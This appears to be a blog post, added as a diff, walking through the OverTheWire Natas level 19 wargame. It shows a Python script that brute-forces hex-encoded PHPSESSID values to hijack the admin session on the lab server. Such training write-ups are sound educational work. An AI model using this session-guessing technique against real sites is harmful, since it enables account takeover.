@@ -1,0 +1,59 @@
+---
+layout: post
+title:  "Natas Level 18 → Level 19"
+date:   2021-05-29 20:55:52
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: What the hex?
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+The natas19 site tells us that the site is nearly identical to the the previous level, and that session ids are no longer sequential. There is no source code to view.
+
+Let's start opening the Developer Tools, clicking on Storage and then entering some random data into the username and password fields.
+
+We now have a much longer value for PHPSESSID. Here's the value I received:
+
+```
+3335362d6e617461733230
+```
+
+My first thought is the value appears to be hexadecimal. Let's treat it as such and attempt to decode it. While there are plenty of tools to decode base64, I opted to use [CyberChef](https://gchq.github.io/CyberChef). Feel free to use any utility you want to decode the value.
+
+CyberChef returned **356-natas20**. This looks like the PHPSESSID is now made up of a random number, followed by a dash, followed by the username entered into the form.
+
+Let's update our script from the last level.
+
+```python
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+import concurrent.futures
+
+natas19_password = '4------------------------------s'
+session = requests.Session()
+
+
+def get_phpsessid(id):
+    raw_id = str(id) + "-admin"
+    enc_id = raw_id.encode('utf-8').hex()
+
+    resp = requests.get('http://natas19.natas.labs.overthewire.org/index.php',
+                        cookies={"PHPSESSID": enc_id},
+                        auth=HTTPBasicAuth('natas19', natas19_password))
+
+    if "You are logged in as a regular user" not in resp.text:
+        print(f'The admin id is {id}')
+        print(resp.text)
+        exit(0)
+
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    executor.map(get_phpsessid, list(range(641)))
+```
